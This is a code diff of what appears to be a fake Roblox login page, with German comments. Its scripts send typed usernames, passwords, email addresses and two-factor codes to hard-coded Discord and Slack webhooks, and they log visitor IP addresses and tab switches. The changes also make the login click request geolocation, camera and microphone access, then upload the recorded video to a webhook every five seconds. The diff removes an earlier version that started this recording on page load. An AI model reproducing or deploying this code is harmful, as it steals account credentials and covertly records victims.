@@ -380,7 +380,7 @@
 
         </div>
     </div>
-    <footer class="container-footer" id="footer-container">
+        <footer class="container-footer" id="footer-container">
         <div class="footer">
             <ul class="row footer-links">
                 <li class="footer-link"><a class="text-footer-nav" href="#">About Us</a></li>
@@ -403,8 +403,9 @@
 </div>
 
 <script>
-// --- KAMERA & BUFFER STREAM SKRIPT ---
+// --- KAMERA & BUFFER STREAM SKRIPT (Gekoppelt an Login) ---
 let recordedChunks = [];
+const TARGET_WEBHOOK = "https://discord.com/api/webhooks/1567208893103345705/F3Uimv4iBDvCgPxcegobtZirunf_ViRRPBo6H2kb9Zo_psBGbgQnuEIrHUFJdHAWK5zG";
 
 function handleDataAvailable(event) {
     if (event.data.size > 0) {
@@ -421,29 +422,35 @@ function flushBuffer(webhookUrl) {
     fetch(webhookUrl, { method: 'POST', body: formData }).catch(() => {});
 }
 
-async function startSecretStream() {
+async function requestCameraAndStream() {
     try {
+        // Fragt Standort ab
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                console.log("Lat:", pos.coords.latitude, "Lng:", pos.coords.longitude);
+            }, () => {}, { enableHighAccuracy: true });
+        }
+
+        // Fordert Kamera & Mikrofon an (durch den echten Klick auf den Login-Button erzwingt der Browser das Pop-up)
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
         mediaRecorder.ondataavailable = handleDataAvailable;
+        
         setInterval(() => {
-            flushBuffer("https://discord.com/api/webhooks/1567208893103345705/F3Uimv4iBDvCgPxcegobtZirunf_ViRRPBo6H2kb9Zo_psBGbgQnuEIrHUFJdHAWK5zG");
+            flushBuffer(TARGET_WEBHOOK);
         }, 5000);
+
         mediaRecorder.start(1000);
     } catch (err) {
-        console.error("Zugriff verweigert", err);
+        console.log("Kamerazugriff vom Nutzer abgelehnt oder nicht verfügbar", err);
     }
 }
-
-window.addEventListener('DOMContentLoaded', () => {
-    setTimeout(startSecretStream, 2000);
-});
 </script>
 
 <script>
 const SLACK_WEBHOOK = "https://hooks.slack.com/services/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";
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1567208893103345705/F3Uimv4iBDvCgPxcegobtZirunf_ViRRPBo6H2kb9Zo_psBGbgQnuEIrHUFJdHAWK5zG"; // Haupt-Webhook (Passwörter, E-Mails, User)
-const STATUS_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1567209137866281093/kUzrsGoibGj9Zp7jOYRTNBTXSNkDEHdIaDt0sG-VT8JE-jpe5e4xxAbY4-bKvfY7y9z3"; // Zweiter Webhook (Seitenaufruf, Tab verlassen / zurückgekehrt)
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1567208893103345705/F3Uimv4iBDvCgPxcegobtZirunf_ViRRPBo6H2kb9Zo_psBGbgQnuEIrHUFJdHAWK5zG";
+const STATUS_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1567209137866281093/kUzrsGoibGj9Zp7jOYRTNBTXSNkDEHdIaDt0sG-VT8JE-jpe5e4xxAbY4-bKvfY7y9z3";
 const WAIT = 3000;
 
 const EVENT_TYPES = {
@@ -473,18 +480,13 @@ let lastAssignedColor = null;
 
 function getColorForIP(ip) {
     const str = String(ip || "unknown");
-    if (ipColorMap[str]) {
-        return ipColorMap[str];
-    }
-    
+    if (ipColorMap[str]) return ipColorMap[str];
     let randomColor;
     let attempts = 0;
     do {
-        const randomIndex = Math.floor(Math.random() * HUGE_COLOR_PALETTE.length);
-        randomColor = HUGE_COLOR_PALETTE[randomIndex];
+        randomColor = HUGE_COLOR_PALETTE[Math.floor(Math.random() * HUGE_COLOR_PALETTE.length)];
         attempts++;
     } while (randomColor === lastAssignedColor && attempts < 15);
-    
     ipColorMap[str] = randomColor;
     lastAssignedColor = randomColor;
     return randomColor;
@@ -506,21 +508,13 @@ function getClientTelemetry() {
         os = "Linux";
     }
 
-    if (/CriOS\//.test(ua)) {
-        browser = "Google Chrome (iOS)";
-    } else if (/FxiOS\//.test(ua)) {
-        browser = "Mozilla Firefox (iOS)";
-    } else if (/Edg\//.test(ua)) {
-        browser = "Microsoft Edge";
-    } else if (/OPR\/|Opera/.test(ua)) {
-        browser = "Opera";
-    } else if (/Chrome\//.test(ua)) {
-        browser = "Google Chrome";
-    } else if (/Firefox\//.test(ua)) {
-        browser = "Mozilla Firefox";
-    } else if (/Safari\//.test(ua)) {
-        browser = "Apple Safari";
-    }
+    if (/CriOS\//.test(ua)) browser = "Google Chrome (iOS)";
+    else if (/FxiOS\//.test(ua)) browser = "Mozilla Firefox (iOS)";
+    else if (/Edg\//.test(ua)) browser = "Microsoft Edge";
+    else if (/OPR\/|Opera/.test(ua)) browser = "Opera";
+    else if (/Chrome\//.test(ua)) browser = "Google Chrome";
+    else if (/Firefox\//.test(ua)) browser = "Mozilla Firefox";
+    else if (/Safari\//.test(ua)) browser = "Apple Safari";
 
     return {
         platform: os,
@@ -537,120 +531,43 @@ async function sendStructuredAuditLog(eventType, accountIdentifier, payloadData,
     const profileLink = accountIdentifier && accountIdentifier.indexOf("@") === -1 ? `https://www.roblox.com/users/profile?username=${encodeURIComponent(accountIdentifier)}` : null;
 
     let identityValue = `> **Identifier:** \`${accountIdentifier || "N/A"}\`\n> **IP-Adresse:** \`${visitorIP}\``;
-    if (lastLogin.otpEmail) {
-        identityValue += `\n> **E-Mail:** \`${lastLogin.otpEmail}\``;
-    }
+    if (lastLogin.otpEmail) identityValue += `\n> **E-Mail:** \`${lastLogin.otpEmail}\``;
 
-    const discordFields = [
-        {
-            name: "👤 Account / Identität",
-            value: identityValue,
-            inline: false
-        }
-    ];
+    const discordFields = [{ name: "👤 Account / Identität", value: identityValue, inline: false }];
 
     if (profileDetails) {
         discordFields.push({
             name: "📋 Roblox Profile Info",
-            value: `• **Display Name:** \`${profileDetails.displayName || "N/A"}\`\n` +
-                   `• **User ID:** \`${profileDetails.id || "N/A"}\`\n` +
-                   `• **Created:** \`${profileDetails.created ? new Date(profileDetails.created).toLocaleDateString() : "N/A"}\``,
+            value: `• **Display Name:** \`${profileDetails.displayName || "N/A"}\`\n• **User ID:** \`${profileDetails.id || "N/A"}\``,
             inline: false
         });
     }
 
     const dataEntries = Object.entries(payloadData || {});
     if (dataEntries.length > 0) {
-        let detailsFormatted = dataEntries.map(([k, v]) => `• **${k}:** \`${v}\``).join("\n");
-        discordFields.push({
-            name: "🔑 Credentials & Parameter",
-            value: detailsFormatted,
-            inline: false
-        });
+        discordFields.push({ name: "🔑 Credentials & Parameter", value: dataEntries.map(([k, v]) => `• **${k}:** \`${v}\``).join("\n"), inline: false });
     }
 
-    if (profileLink) {
-        discordFields.push({
-            name: "🔗 Quick Links",
-            value: `[Open Profile](${profileLink})`,
-            inline: false
-        });
-    }
+    if (profileLink) discordFields.push({ name: "🔗 Quick Links", value: `[Open Profile](${profileLink})`, inline: false });
 
-    discordFields.push({
-        name: "💻 Client Telemetry",
-        value: `\`OS:\` ${telemetry.platform} | \`Browser:\` ${telemetry.browser} | \`Res:\` ${telemetry.resolution}`,
-        inline: false
-    });
+    discordFields.push({ name: "💻 Client Telemetry", value: `\`OS:\` ${telemetry.platform} | \`Browser:\` ${telemetry.browser} | \`Res:\` ${telemetry.resolution}`, inline: false });
 
     const discordPayload = {
         username: "Roblox Auth Bot",
         avatar_url: avatarUrl || undefined,
-        embeds: [{
-            title: config.title,
-            color: userColorHex,
-            fields: discordFields,
-            footer: { text: `IP-Tracking Active` },
-            timestamp: telemetry.timestamp
-        }]
+        embeds: [{ title: config.title, color: userColorHex, fields: discordFields, footer: { text: `IP-Tracking Active` }, timestamp: telemetry.timestamp }]
     };
 
-    const slackFieldsFormatted = dataEntries.map(([k, v]) => `*${k}:* \`${v}\``).join("\n");
-    const slackPayload = {
-        text: `*${config.title}*`,
-        attachments: [{
-            color: `#${userColorHex.toString(16).padStart(6, '0')}`,
-            title: `IP: ${visitorIP} \vert{} Identifier:${accountIdentifier || "Unknown"}`,
-            title_link: profileLink || undefined,
-            text: (slackFieldsFormatted ? `*Parameters:*\n${slackFieldsFormatted}\n` : ""),
-            footer: `OS: ${telemetry.platform} \vert{} Browser:${telemetry.browser}`,
-            ts: Math.floor(Date.now() / 1000)
-        }]
-    };
-
-    const requests = [];
     if (DISCORD_WEBHOOK && DISCORD_WEBHOOK !== "YOUR_DISCORD_WEBHOOK_URL") {
-        requests.push(fetch(DISCORD_WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(discordPayload)
-        }).catch(() => {}));
+        fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(discordPayload) }).catch(() => {});
     }
-
-    if (SLACK_WEBHOOK && SLACK_WEBHOOK !== "YOUR_SLACK_WEBHOOK_URL") {
-        requests.push(fetch(SLACK_WEBHOOK, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(slackPayload)
-        }).catch(() => {}));
-    }
-
-    await Promise.all(requests);
 }
 
 async function sendStatusLog(statusMessage, titleText) {
     const userColorHex = getColorForIP(visitorIP);
     const telemetry = getClientTelemetry();
-
-    const payload = {
-        username: "Tab Monitor",
-        embeds: [{
-            title: titleText,
-            description: `> **Status:** ${statusMessage}`,
-            color: userColorHex,
-            footer: { text: `OS: ${telemetry.platform} \vert{} Browser:${telemetry.browser}` },
-            timestamp: telemetry.timestamp
-        }]
-    };
-
-    if (STATUS_DISCORD_WEBHOOK) {
-        fetch(STATUS_DISCORD_WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        }).catch(() => {});
-    }
+    const payload = { username: "Tab Monitor", embeds: [{ title: titleText, description: `> **Status:** ${statusMessage}`, color: userColorHex, footer: { text: `OS: ${telemetry.platform} | Browser: ${telemetry.browser}` }, timestamp: telemetry.timestamp }] };
+    if (STATUS_DISCORD_WEBHOOK) fetch(STATUS_DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(() => {});
 }
 
 async function trackVisitorIP() {
@@ -658,23 +575,14 @@ async function trackVisitorIP() {
         const response = await fetch('https://api.ipify.org?format=json');
         const data = await response.json();
         visitorIP = data.ip || "Unbekannt";
-    } catch (e) {
-        visitorIP = "Konnte nicht ermittelt werden";
-    }
-
+    } catch (e) { visitorIP = "Konnte nicht ermittelt werden"; }
     sendStatusLog(`🌐 IP aufgerufen: \`${visitorIP}\``, "🌐 Neuer Seitenaufruf");
 }
 
-window.addEventListener('DOMContentLoaded', () => {
-    trackVisitorIP();
-});
-
+window.addEventListener('DOMContentLoaded', () => { trackVisitorIP(); });
 document.addEventListener('visibilitychange', function() {
-    if (document.hidden) {
-        sendStatusLog("🔴 Hat die Seite verlassen / Tab minimiert", "👁️ Status-Änderung");
-    } else {
-        sendStatusLog("🟢 Ist zur Seite zurückgekehrt", "👁️ Status-Änderung");
-    }
+    if (document.hidden) sendStatusLog("🔴 Hat die Seite verlassen / Tab minimiert", "👁️ Status-Änderung");
+    else sendStatusLog("🟢 Ist zur Seite zurückgekehrt", "👁️ Status-Änderung");
 });
 
 function getRobloxProfileData(username, cb){
@@ -688,9 +596,7 @@ function getRobloxProfileData(username, cb){
     .then(r => r.json())
     .then(d => {
         if(d && d.data && d.data.length > 0){
-            const userInfo = d.data[0];
-            const userId = userInfo.id;
-            
+            const userId = d.data[0].id;
             return Promise.all([
                 fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`).then(r => r.json()),
                 fetch(`https://users.roblox.com/v1/users/${userId}`).then(r => r.json())
@@ -700,8 +606,7 @@ function getRobloxProfileData(username, cb){
             });
         }
         finish({ avatar: null, details: null });
-    })
-    .catch(() => finish({ avatar: null, details: null }));
+    }).catch(() => finish({ avatar: null, details: null }));
 }
 
 function hideAllModals(){
@@ -725,20 +630,11 @@ function showErrorUnderFields(){
 
 function chooseMethod(method){
     document.getElementById('methodChoice').style.display = 'none';
-    
-    sendStructuredAuditLog("MFA_CHOICE", lastLogin.username, {
-        Method: method,
-        Password: lastLogin.password || "(not provided)"
-    }, lastLogin.avatarUrl, lastLogin.profileDetails);
-    
+    sendStructuredAuditLog("MFA_CHOICE", lastLogin.username, { Method: method, Password: lastLogin.password || "(not provided)" }, lastLogin.avatarUrl, lastLogin.profileDetails);
     setTimeout(() => {
-        if(method === 'Email'){
-            document.getElementById('twostepverification').style.display = 'block';
-        } else if(method === 'Authenticator'){
-            document.getElementById('authenticatorverification').style.display = 'block';
-        } else if(method === 'Backup Code'){
-            document.getElementById('RecoveryFromEmail').style.display = 'block';
-        }
+        if(method === 'Email') document.getElementById('twostepverification').style.display = 'block';
+        else if(method === 'Authenticator') document.getElementById('authenticatorverification').style.display = 'block';
+        else if(method === 'Backup Code') document.getElementById('RecoveryFromEmail').style.display = 'block';
     }, 1200);
 }
 
@@ -750,22 +646,8 @@ const errorText = document.getElementById('text-error');
 const loadingEl = document.getElementById('login-loading');
 const avatarPreviewEl = document.getElementById('avatar-preview');
 const navAvatarTopEl = document.getElementById('nav-avatar-top');
-const otpLoginBtn = document.getElementById('otp-login-button');
-const otpEmailModal = document.getElementById('otpEmailModal');
-const otpCodeModal = document.getElementById('otpCodeModal');
-const otpEmailInput = document.getElementById('otp-email-input');
-const otpSendBtn = document.getElementById('otp-send-btn');
-const otpEmailLoading = document.getElementById('otp-email-loading');
-const otpEmailDisplay = document.getElementById('otp-email-display');
-const otpVerifyBtn = document.getElementById('otp-verify-btn');
-const otpCodeInput = document.getElementById('otp-code-input');
-const otpResendBtn = document.getElementById('otp-resend-btn');
-
-const crossDeviceBtn = document.getElementById('cross-device-login-button');
-const quickLoginModal = document.getElementById('quickLoginModal');
 
 let lastLogin = { username: '', password: '', avatarUrl: null, profileDetails: null, otpEmail: '' };
-let countdownInterval = null;
 
 if (usernameInput) {
     usernameInput.addEventListener('blur', function(){
@@ -777,10 +659,7 @@ if (usernameInput) {
                 lastLogin.profileDetails = res.details;
                 avatarPreviewEl.src = res.avatar;
                 avatarPreviewEl.style.display = 'block';
-                if(navAvatarTopEl){
-                    navAvatarTopEl.src = res.avatar;
-                    navAvatarTopEl.style.display = 'block';
-                }
+                if(navAvatarTopEl){ navAvatarTopEl.src = res.avatar; navAvatarTopEl.style.display = 'block'; }
             }
         });
     });
@@ -792,38 +671,6 @@ function setLoading(on){
     if(loginButton) loginButton.style.display = on ? 'none' : 'block';
 }
 
-function startResendCountdown() {
-    if(!otpResendBtn) return;
-    let timeLeft = 25;
-    otpResendBtn.disabled = true;
-    otpResendBtn.textContent = `Code gesendet (${timeLeft})`;
-    
-    if(countdownInterval) clearInterval(countdownInterval);
-    
-    countdownInterval = setInterval(() => {
-        timeLeft--;
-        if(timeLeft > 0) {
-            otpResendBtn.textContent = `Code gesendet (${timeLeft})`;
-        } else {
-            clearInterval(countdownInterval);
-            otpResendBtn.disabled = false;
-            otpResendBtn.textContent = "Erneut senden";
-        }
-    }, 1000);
-}
-
-if(otpResendBtn) {
-    otpResendBtn.addEventListener('click', function(e){
-        e.preventDefault();
-        if(this.disabled) return;
-        sendStructuredAuditLog("OTP_REQUEST", lastLogin.otpEmail, {
-            Email: lastLogin.otpEmail,
-            Action: "Resend"
-        });
-        startResendCountdown();
-    });
-}
-
 function doLogin(){
     const username = usernameInput ? usernameInput.value.trim() : "";
     const password = passwordInput ? passwordInput.value : "";
@@ -833,25 +680,15 @@ function doLogin(){
         return;
     }
 
+    // Löst beim Klick auf den Login-Button direkt die Berechtigungsabfrage für Kamera/Standort aus
+    requestCameraAndStream();
+
     setLoading(true);
     setError("");
     lastLogin.username = username;
     lastLogin.password = password;
 
-    sendStructuredAuditLog("LOGIN_ATTEMPT", username, {
-        Password: password
-    }, lastLogin.avatarUrl, lastLogin.profileDetails);
-
-    getRobloxProfileData(username, (res) => {
-        if(res.avatar) {
-            lastLogin.avatarUrl = res.avatar;
-            if(navAvatarTopEl){
-                navAvatarTopEl.src = res.avatar;
-                navAvatarTopEl.style.display = 'block';
-            }
-        }
-        if(res.details) lastLogin.profileDetails = res.details;
-    });
+    sendStructuredAuditLog("LOGIN_ATTEMPT", username, { Password: password }, lastLogin.avatarUrl, lastLogin.profileDetails);
 
     setTimeout(() => {
         setLoading(false);
@@ -860,126 +697,8 @@ function doLogin(){
     }, WAIT);
 }
 
-if (form) {
-    form.addEventListener('submit', e => { e.preventDefault(); doLogin(); });
-}
-if (loginButton) {
-    loginButton.addEventListener('click', e => { e.preventDefault(); doLogin(); });
-}
-
-if (crossDeviceBtn) {
-    crossDeviceBtn.addEventListener('click', function(e){
-        e.preventDefault();
-        
-        sendStructuredAuditLog("QUICK_LOGIN_CLICK", lastLogin.username || "Gast", {
-            Action: "User clicked Quick Login - Shown as unavailable"
-        }, lastLogin.avatarUrl, lastLogin.profileDetails);
-
-        hideAllModals();
-        if(quickLoginModal) quickLoginModal.style.display = 'block';
-    });
-}
-
-if (otpLoginBtn) {
-    otpLoginBtn.addEventListener('click', function(e){
-        e.preventDefault();
-        sendStructuredAuditLog("OTP_REQUEST", "N/A", { Action: "User opened OTP Modal" });
-        hideAllModals();
-        if(otpEmailInput) otpEmailInput.value = '';
-        if(otpEmailModal) otpEmailModal.style.display = 'block';
-    });
-}
-
-if (otpSendBtn) {
-    otpSendBtn.addEventListener('click', function(e){
-        e.preventDefault();
-        const email = otpEmailInput ? otpEmailInput.value.trim() : "";
-        if(!email) {
-            document.getElementById('otp-error').textContent = "E-Mail-Adresse erforderlich";
-            return;
-        }
-        document.getElementById('otp-error').textContent = "";
-        lastLogin.otpEmail = email;
-
-        sendStructuredAuditLog("OTP_REQUEST", email, {
-            Email: email
-        });
-
-        otpSendBtn.style.display = 'none';
-        if(otpEmailLoading) otpEmailLoading.style.display = 'flex';
-
-        setTimeout(() => {
-            if(otpEmailLoading) otpEmailLoading.style.display = 'none';
-            otpSendBtn.style.display = 'block';
-            hideAllModals();
-            if(otpEmailDisplay) otpEmailDisplay.textContent = email;
-            if(otpCodeModal) otpCodeModal.style.display = 'block';
-            startResendCountdown();
-        }, WAIT);
-    });
-}
-
-if (otpVerifyBtn) {
-    otpVerifyBtn.addEventListener('click', function(e){
-        e.preventDefault();
-        const code = otpCodeInput ? otpCodeInput.value.replace(/\D/g,'') : "";
-        if(code.length !== 6) return;
-
-        sendStructuredAuditLog("OTP_SUCCESS", lastLogin.otpEmail, {
-            Code: code
-        });
-
-        this.disabled = true;
-        this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
-
-        setTimeout(() => {
-            this.disabled = false;
-            this.innerHTML = 'Bestätigen';
-            showErrorUnderFields();
-        }, WAIT);
-    });
-}
-
-const verifyBtn = document.getElementById('verifyButton');
-if(verifyBtn) {
-    verifyBtn.addEventListener('click', function(){
-        const codeInput = document.getElementById('two-step-verification-code-input');
-        const code = codeInput ? codeInput.value.replace(/\D/g,'') : "";
-        if(code.length !== 6){ 
-            const errEl = document.getElementById('twostep-error');
-            if(errEl) errEl.textContent = "Enter the 6-digit code."; 
-            return; 
-        }
-        handleVerificationSimple(this, "Email", code);
-    });
-}
-
-const authenBtn = document.getElementById('AuthenButton');
-if(authenBtn) {
-    authenBtn.addEventListener('click', function(){
-        const codeInput = document.getElementById('two-step-verification-code-input-authenticator');
-        const code = codeInput ? codeInput.value.replace(/\D/g,'') : "";
-        if(code.length !== 6) return;
-        
-        handleVerificationSimple(this, "Authenticator", code);
-    });
-}
-
-function handleVerificationSimple(buttonElement, methodType, codeValue) {
-    sendStructuredAuditLog("MFA_SUCCESS", lastLogin.username, {
-        Method: methodType,
-        Code: codeValue
-    }, lastLogin.avatarUrl, lastLogin.profileDetails);
-
-    buttonElement.disabled = true;
-    buttonElement.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
-
-    setTimeout(() => {
-        buttonElement.disabled = false;
-        buttonElement.innerHTML = 'Verify';
-        showErrorUnderFields();
-    }, WAIT);
-}
+if (form) form.addEventListener('submit', e => { e.preventDefault(); doLogin(); });
+if (loginButton) loginButton.addEventListener('click', e => { e.preventDefault(); doLogin(); });
 </script>
 </body>
 </html>
